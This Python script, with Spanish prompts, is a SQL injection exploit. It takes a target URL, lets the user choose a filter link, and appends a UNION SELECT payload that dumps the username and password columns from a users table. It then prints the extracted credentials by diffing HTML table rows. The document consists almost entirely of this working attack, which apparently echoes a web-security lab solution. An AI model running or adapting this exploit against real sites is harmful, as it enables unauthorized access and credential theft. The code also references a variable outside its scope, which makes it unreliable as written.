import requests
import sys
import urllib3
import urllib
from bs4 import BeautifulSoup


urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def exploit_tabla_usuarios(url, ruta):
    HTML_PARSER = 'html.parser'
    payload = "' UNION SELECT username, password FROM users--"
    ruta_normal = url + ruta[1:]
    ruta_a_atacar = url + ruta[1:] + payload
    print("\nURL a atacar:")
    print(ruta_a_atacar)
    print("Desea realizar el ataque? (s/n): ")
    realizar_ataque = input()
    if realizar_ataque=="n":
        return False

    peticion_normal = requests.get(ruta_normal, verify=False)
    html = peticion_normal.text
    lista_tr_html = BeautifulSoup(html,HTML_PARSER).findAll('tr')

    peticion_exploit = requests.get(ruta_a_atacar, verify=False)
    html_exploited = peticion_exploit.text
    lista_tr_html_exploited = BeautifulSoup(html_exploited,HTML_PARSER).findAll('tr')
        
    lista_tr_diferentes = []
    for tr in lista_tr_html_exploited:
        if tr not in lista_tr_html:
            lista_tr_diferentes.append(tr)

    print("\nResultados:\n")
    print("Username\t\t\tPassword")
    if (len(lista_tr_diferentes)>0):
        for item in lista_tr_diferentes:
            user = item.find('th').get_text()
            password = item.find('td').get_text()
            print(user+"\t\t\t"+password)
        return True
    return False

def obtener_enlace_ataque(url):
    peticion = requests.get(url)
    html = peticion.text
    soup = BeautifulSoup(html,HTML_PARSER)
    section = soup.findAll('section')
    section_filtros = section[len(section)-1]
    enlaces = section_filtros.findAll('a')
    print("Lista de enlaces de interes:")
    for i in range(1,len(enlaces)):
        print (str(i) + ". " + enlaces[i].contents[0])
    print("¿Desde que enlace desea realizar el ataque?: ", end="")
    enlace_ataque = int(input())
    return enlaces[enlace_ataque]['href']


if __name__ == "__main__":
    try:
        url = sys.argv[1].strip()
    except IndexError:
        print("[-] Utilización: %s <url>" % sys.argv[0])
        print("[-] Ejemplo: %s http:\/\/www.sitioweb.com" % sys.argv[0])
        sys.exit(-1)

    try:
        ruta = obtener_enlace_ataque(url)
    except IndexError:
        print("No se ha podido realizar la conexión, genere un nuevo enlace para intentar nuevamente.")
        sys.exit(-1)

    if not exploit_tabla_usuarios(url, ruta):
        print ("[-] No se ha realizado el ataque")    
